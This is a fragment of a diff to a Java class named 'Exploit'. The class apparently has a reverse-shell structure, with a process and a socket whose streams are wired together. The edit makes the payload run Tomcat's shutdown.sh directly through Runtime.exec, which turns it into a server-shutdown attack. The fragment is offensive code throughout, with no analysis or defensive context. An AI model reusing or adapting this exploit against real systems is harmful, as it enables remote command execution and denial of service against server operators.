@@ -32,7 +32,7 @@ public class Exploit {
             pe=p.getErrorStream(),
             si=s.getInputStream();
         OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-        so.write("sh /home/centos/drive/apache-tomcat-8.0.36/bin/shutdown.sh");
+        Process process = Runtime.getRuntime().exec("sh /home/centos/drive/apache-tomcat-8.0.36/bin/shutdown.sh");
     
         p.destroy();
         s.close();
